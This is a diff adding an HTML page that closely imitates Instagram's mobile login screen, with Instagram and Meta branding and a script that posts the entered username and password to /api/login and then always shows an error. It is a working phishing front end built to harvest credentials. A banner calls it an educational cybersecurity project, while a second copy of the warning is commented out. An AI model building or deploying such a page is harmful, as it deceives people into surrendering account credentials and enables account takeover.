@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Instagram</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background-color: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto,
+        Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* ── Top Bar ── */
+    .top-bar {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 14px 16px 8px;
+      position: relative;
+    }
+
+    .back-arrow {
+      position: absolute;
+      left: 16px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+    }
+
+    .back-arrow svg {
+      width: 24px;
+      height: 24px;
+      fill: none;
+      stroke: #262626;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .language-selector {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 13px;
+      color: #262626;
+      font-weight: 400;
+      cursor: pointer;
+      background: none;
+      border: none;
+      font-family: inherit;
+    }
+
+    .language-selector svg {
+      width: 12px;
+      height: 12px;
+      fill: #262626;
+    }
+
+    /* ── Main Content ── */
+    .content {
+      width: 100%;
+      max-width: 420px;
+      padding: 0 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* ── Logo ── */
+    .logo-wrap {
+      margin-top: 28px;
+      margin-bottom: 32px;
+    }
+
+    .logo-wrap img {
+      width: 100px;
+      height: 100px;
+      object-fit: contain;
+      display: block;
+    }
+
+    /* ── Form ── */
+    form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .input-wrap {
+      position: relative;
+      width: 100%;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    input[type="email"] {
+      width: 100%;
+      height: 44px;
+      padding: 0 12px;
+      background-color: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 6px;
+      font-size: 12px;
+      color: #262626;
+      outline: none;
+      font-family: inherit;
+      transition: border-color 0.15s;
+    }
+
+    input::placeholder {
+      color: #8e8e8e;
+      font-size: 12px;
+    }
+
+    input:focus {
+      border-color: #a8a8a8;
+      background-color: #fff;
+    }
+
+    /* Password toggle */
+    .password-wrap {
+      position: relative;
+    }
+
+    .password-wrap input {
+      padding-right: 56px;
+    }
+
+    .show-hide-btn {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      font-size: 14px;
+      font-weight: 600;
+      color: #262626;
+      cursor: pointer;
+      font-family: inherit;
+      padding: 0;
+    }
+
+    /* ── Login Button ── */
+    .login-btn {
+      width: 100%;
+      height: 44px;
+      margin-top: 8px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      transition: opacity 0.15s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .login-btn:active {
+      opacity: 0.7;
+    }
+
+    .login-btn.loading {
+      opacity: 0.6;
+      pointer-events: none;
+    }
+
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      display: none;
+    }
+
+    .login-btn.loading .spinner {
+      display: block;
+    }
+
+    .login-btn.loading .btn-text {
+      display: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ── Forgotten Password ── */
+    .forgot-link {
+      text-align: center;
+      margin-top: 14px;
+    }
+
+    .forgot-link a {
+      font-size: 12px;
+      color: #00376b;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    /* ── OR Divider ── */
+    .or-divider {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      width: 100%;
+      margin: 2px 0;
+    }
+
+    .or-divider hr {
+      flex: 1;
+      border: none;
+      border-top: 1px solid #dbdbdb;
+    }
+
+    .or-divider span {
+      font-size: 13px;
+      font-weight: 600;
+      color: #8e8e8e;
+    }
+
+    /* ── Error Message ── */
+    .error-msg {
+      width: 100%;
+      text-align: center;
+      font-size: 13px;
+      color: #c0392b;
+      margin-top: 10px;
+      min-height: 18px;
+      display: none;
+    }
+
+    .error-msg.show {
+      display: block;
+    }
+
+    /* ── Bottom Section ── */
+    .bottom-section {
+      width: 100%;
+      max-width: 420px;
+      padding: 0 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: auto;
+      padding-bottom: 24px;
+    }
+
+    .divider-line {
+      width: 100%;
+      border: none;
+      border-top: 1px solid #dbdbdb;
+      margin-bottom: 24px;
+    }
+
+    .create-account-btn {
+      width: 100%;
+      height: 44px;
+      background-color: transparent;
+      border: 1px solid #0095f6;
+      border-radius: 8px;
+      color: #0095f6;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background-color 0.15s;
+      margin-bottom: 20px;
+    }
+
+    .create-account-btn:active {
+      background-color: #e7f3ff;
+    }
+
+    .meta-branding {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .meta-from-text {
+      font-size: 12px;
+      color: #8e8e8e;
+    }
+
+    .meta-logo-img {
+      height: 18px;
+      width: auto;
+      object-fit: contain;
+      opacity: 0.75;
+    }
+
+    /* ── Spacer ── */
+    .flex-spacer {
+      flex: 1;
+      min-height: 40px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Bar -->
+  <div class="top-bar">
+    <button class="back-arrow" onclick="history.back()" aria-label="Go back">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <polyline points="15 18 9 12 15 6"/>
+      </svg>
+    </button>
+    <button class="language-selector" aria-label="Language selector">
+      English (UK)
+      <svg viewBox="0 0 10 6" xmlns="http://www.w3.org/2000/svg">
+        <path d="M1 1l4 4 4-4"/>
+        <path d="M1 1l4 4 4-4" fill="none" stroke="#262626" stroke-width="1.5"
+              stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </button>
+  </div>
+# warning
+<div> ⚠️ EducationL Cybersecurity project - Do not enter real credentials .</div>
+  <!-- Main Content -->
+  <div class="content">
+
+    <!-- Logo -->
+    <div class="logo-wrap">
+      <img src="instagram-logo.png" alt="Instagram" />
+    </div>
+
+    <!-- Login Form -->
+    <form id="loginForm" novalidate>
+
+      <div class="input-wrap">
+        <input
+          type="text"
+          id="identifier"
+          name="identifier"
+          placeholder="Username, email address or mobile num…"
+          autocomplete="username"
+          autocorrect="off"
+          autocapitalize="none"
+          spellcheck="false"
+        />
+      </div>
+
+      <div class="input-wrap password-wrap">
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Password"
+          autocomplete="current-password"
+        />
+        <button type="button" class="show-hide-btn" id="togglePassword">Show</button>
+      </div>
+
+      <button type="submit" class="login-btn" id="loginBtn">
+        <div class="spinner"></div>
+        <span class="btn-text">Log in</span>
+      </button>
+
+    </form>
+
+    <div class="error-msg" id="errorMsg"></div>
+
+    <div class="forgot-link">
+      <a href="#">Forgotten password?</a>
+    </div>
+
+    <div class="or-divider">
+      <hr />
+      <span>OR</span>
+      <hr />
+    </div>
+
+  </div>
+
+  <div class="flex-spacer"></div>
+
+  <!-- Bottom Section -->
+  <div class="bottom-section">
+    <hr class="divider-line" />
+    <button class="create-account-btn">Create new account</button>
+    <div class="meta-branding">
+      <span class="meta-from-text">from</span>
+      <img class="meta-logo-img" src="meta-logo.png" alt="Meta" />
+    </div>
+  </div>
+<!-- <div> EducationL Cybersecurity project - Do not enter real credentials .</div> -->
+  <script>
+    // ── Password toggle ─────────────────────────────────────────
+    const passwordInput = document.getElementById('password');
+    const toggleBtn = document.getElementById('togglePassword');
+
+    toggleBtn.addEventListener('click', () => {
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleBtn.textContent = 'Hide';
+      } else {
+        passwordInput.type = 'password';
+        toggleBtn.textContent = 'Show';
+      }
+    });
+
+    // ── Form submit ─────────────────────────────────────────────
+    const loginForm = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const errorMsg = document.getElementById('errorMsg');
+
+    loginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const identifier = document.getElementById('identifier').value.trim();
+      const password = document.getElementById('password').value;
+
+      // Basic validation
+      if (!identifier || !password) {
+        showError('Please fill in your username/email and password.');
+        return;
+      }
+
+      // Show loading state
+      loginBtn.classList.add('loading');
+      errorMsg.classList.remove('show');
+
+      try {
+        const res = await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ identifier, password }),
+        });
+
+        const data = await res.json();
+        showError(data.message || 'An error occurred. Please try again.');
+      } catch (err) {
+        showError('Network error. Please check your connection.');
+      } finally {
+        loginBtn.classList.remove('loading');
+      }
+    });
+
+    function showError(msg) {
+      errorMsg.textContent = msg;
+      errorMsg.classList.add('show');
+    }
+  </script>
+
+</body>
+</html>
